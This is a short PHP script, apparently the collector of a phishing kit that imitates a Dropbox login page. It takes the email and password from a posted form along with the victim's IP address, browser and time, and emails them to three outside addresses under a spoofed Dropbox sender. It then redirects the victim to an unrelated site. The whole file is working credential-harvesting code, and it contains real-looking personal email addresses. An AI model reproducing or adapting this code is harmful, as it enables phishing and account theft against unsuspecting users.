<?php

$ip = getenv("REMOTE_ADDR");
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$browser = $_SERVER['HTTP_USER_AGENT'];
$time = date("m-d-Y g:i:a");
$Email = $_POST['Email'];

$msg = "====================================\n";
$msg .= "Dropbox Login Info by Hoye\n";
$msg .= "===================================\n";
$msg .= "Email : ".$_POST['email']."\n";
$msg .= "Password : ".$_POST['password']."\n";
$msg .= "Sent from $ip on $time $browser";
$msg .= "====================================\n";

$to = "sunitex.chile@gmail.com, omramy_azad@yahoo.com, kendra_quberry@hotmail.com";
$subject = "DROPBOX $ip $Email";
$from = "From: HOYE Dropbox<no-reply@dropbox.net>";

mail($to,$subject,$msg,$from);

header("Location: http://buckeyebutcher.com/kat/dropb-fud/");


?>